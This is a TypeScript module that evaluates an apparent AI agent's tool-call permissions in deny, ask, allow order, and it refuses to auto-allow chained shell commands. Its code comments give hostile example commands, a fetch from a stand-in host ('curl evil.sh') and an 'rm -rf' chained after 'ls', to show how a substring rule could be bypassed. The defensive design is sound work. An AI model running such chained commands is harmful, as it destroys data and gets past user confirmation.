import { minimatch } from "minimatch";
import type {
  PermissionRule,
  ToolCallContext,
  PermissionResult,
} from "./types.js";

function matchTool(rule: PermissionRule, toolName: string): boolean {
  if (rule.tool === "*") return true;
  return rule.tool === toolName;
}

function matchPattern(rule: PermissionRule, ctx: ToolCallContext) {
  if (!rule.pattern) return true; // 没有 pattern 相当于匹配所有参数
  // bash 命令不是路径,用子串匹配更简单可预期;文件类工具仍用 glob
  if (ctx.toolName === "bash") return ctx.primaryArg.includes(rule.pattern);
  return minimatch(ctx.primaryArg, rule.pattern, { dot: true });
}

/**
 * shell 连接/重定向元字符：出现即视为复合命令。
 *
 * allow 规则的 pattern 是拿整条命令串去比子串的，像 `ls ` 会匹配到
 * `ls -la && curl evil.sh -o x`。所以 allow 只对「单条简单命令」生效，
 * 复合命令一律退回 ask，由用户确认。
 */
const SHELL_CHAINING = /[;&|<>`\n]|\$\(/;

function isSimpleCommand(primaryArg: string): boolean {
  return !SHELL_CHAINING.test(primaryArg);
}

/**
 * 从工具调用参数中提取 "主参数"
 * bash -> command, read_file/write_file -> file_path , 其他 -> JSON 序列化
 */
export function extractPrimaryArg(
  toolName: string,
  params: Record<string, unknown>,
): string {
  if (toolName === "bash" && typeof params.command === "string") {
    return params.command;
  }
  if (typeof params.file_path === "string") {
    return params.file_path;
  }
  if (typeof params.path === "string") {
    return params.path;
  }
  return JSON.stringify(params);
}

/**
 * 核心评估逻辑：按 deny → ask → allow 的优先级匹配规则
 *
 * 规则匹配顺序：
 * 1. 遍历所有 deny 规则，任一命中就拒绝
 * 2. 遍历所有 ask 规则，任一命中就要求确认
 * 3. 遍历所有 allow 规则，任一命中就放行
 * 4. 都没命中 → 默认 ask（安全第一）
 */
export function evaluate(
  rules: PermissionRule[],
  ctx: ToolCallContext,
): PermissionResult {
  // 第一轮 deny
  for (const rule of rules) {
    if (rule.action !== "deny") continue;
    if (matchTool(rule, ctx.toolName) && matchPattern(rule, ctx)) {
      return {
        action: "deny",
        rule,
        reason:
          rule.reason ?? `Blocked by deny rule: ${rule.pattern ?? rule.tool}`,
      };
    }
  }

  // 第二轮 ask
  for (const rule of rules) {
    if (rule.action !== "ask") continue;
    if (matchTool(rule, ctx.toolName) && matchPattern(rule, ctx)) {
      return {
        action: "ask",
        rule,
        reason: rule.reason ?? `Requires confirmation`,
      };
    }
  }

  // 第三轮 allow
  for (const rule of rules) {
    if (rule.action !== "allow") continue;
    // 复合命令不走 allow——避免 `ls ` 把 `ls && rm -rf x` 一并放行
    if (ctx.toolName === "bash" && !isSimpleCommand(ctx.primaryArg)) continue;
    if (matchTool(rule, ctx.toolName) && matchPattern(rule, ctx)) {
      return { action: "allow", rule };
    }
  }

  // 兜底,没有匹配的规则,默认要求确认
  return { action: "ask", reason: "No matching rule -- default to ask" };
}
